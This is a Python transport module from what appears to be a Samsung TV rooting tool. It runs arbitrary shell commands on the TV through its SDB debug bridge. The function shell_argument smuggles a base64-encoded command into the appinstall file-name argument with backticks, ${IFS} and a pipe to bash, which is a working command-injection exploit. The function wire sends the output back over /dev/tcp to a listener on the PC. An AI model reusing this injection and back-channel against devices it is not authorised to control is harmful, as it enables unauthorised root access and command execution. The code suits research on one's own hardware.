"""Direct SDK transport. The callback accepts only this TV and a per-command receipt."""

import sys
import tempfile
if 'packet' not in sys.modules:
    sys.dont_write_bytecode = True
    sys.pycache_prefix = tempfile.mkdtemp(prefix='qn90b-r23-pycache-')

import asyncio
import base64
import os
import re
import secrets
import subprocess

from packet import PC, REPO, SDB, TV, Stop, require

sys.path.insert(0, str(REPO / "src"))
from samsung_tv_root.sdb import SDB_APPINSTALL_MAX_SAFE_BYTES, SdbClient


def shell_argument(command):
    encoded = base64.b64encode(command.encode("ascii")).decode("ascii")
    arg = (
        "0 appinstall tpk new2.tpk`printf${IFS}%s${IFS}"
        + encoded
        + "|base64${IFS}-d|bash`.tpk"
    )
    require(
        len(arg) <= SDB_APPINSTALL_MAX_SAFE_BYTES,
        "SDK command exceeds the reviewed 510-byte limit",
    )
    return arg


def wire(command, port, nonce):
    return shell_argument(
        f"exec 3<>/dev/tcp/{PC}/{port}||exit;echo {nonce} >&3;"
        f"({command}) >&3 2>&3;printf '\\n[exit:%d]\\n' $? >&3"
    )


class DirectSDK:
    def __init__(self):
        require(
            not os.environ.get("TVROOT_BRIDGE_TOKEN"),
            "direct SDK requires an environment without a bridge token",
        )
        self.client = SdbClient(SDB, TV, timeout=12)

    async def present(self):
        result = await asyncio.to_thread(self.client.run, ("devices",), check=True)
        return any(
            line.split()[:1] == [self.client.serial]
            for line in result.stdout.splitlines()
        )

    async def connect(self):
        await asyncio.to_thread(self.client.connect)
        await asyncio.to_thread(self.client.require_device)

    async def disconnect(self):
        await asyncio.to_thread(
            self.client.run, ("disconnect", self.client.serial), check=True
        )
        require(not await self.present(), "ordinary target SDB is still listed")

    async def push(self, source, target):
        await asyncio.to_thread(self.client.push, source, target)

    async def process(self, argument):
        return await asyncio.create_subprocess_exec(
            str(SDB),
            "-s",
            self.client.serial,
            "shell",
            argument,
            stdin=subprocess.DEVNULL,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )

    async def capture(self, command, *, preserve_output=False):
        loop = asyncio.get_running_loop()
        nonce = secrets.token_hex(8)
        receipt = loop.create_future()
        handlers = set()

        async def receive(reader, writer):
            try:
                peer = writer.get_extra_info("peername")
                if (
                    not peer
                    or peer[0] != TV
                    or await reader.readline() != (nonce + "\n").encode()
                ):
                    return
                data = bytearray()
                while chunk := await reader.read(8192):
                    data.extend(chunk)
                    require(len(data) <= 131072, "SDK receipt too large")
                if not receipt.done():
                    receipt.set_result(bytes(data))
            except (OSError, ValueError, Stop) as error:
                if not receipt.done():
                    receipt.set_exception(error)
            finally:
                writer.close()

        def accept(reader, writer):
            job = asyncio.create_task(receive(reader, writer))
            handlers.add(job)
            job.add_done_callback(handlers.discard)

        server = await asyncio.start_server(accept, PC, 0, limit=131072)
        proc = None
        try:
            async with asyncio.timeout(15):
                argument = wire(command, server.sockets[0].getsockname()[1], nonce)
                proc = await self.process(argument)
                data = await receipt
                require(
                    await proc.wait() in (0, 1),
                    "SDK transport returned an unexpected status",
                )
            match = re.fullmatch(rb"(.*)\n\[exit:(\d+)\]\n", data, re.DOTALL)
            require(match, "missing completed SDK shell receipt")
            output = match[1].decode("utf-8", "strict")
            return int(match[2]), output if preserve_output else output.strip()
        finally:
            server.close()
            await server.wait_closed()
            pending = list(handlers)
            for task in pending:
                task.cancel()
            if pending:
                await asyncio.gather(*pending, return_exceptions=True)
            if proc is not None and proc.returncode is None:
                proc.kill()  # Only the desktop client for this diagnostic request.
                await proc.wait()
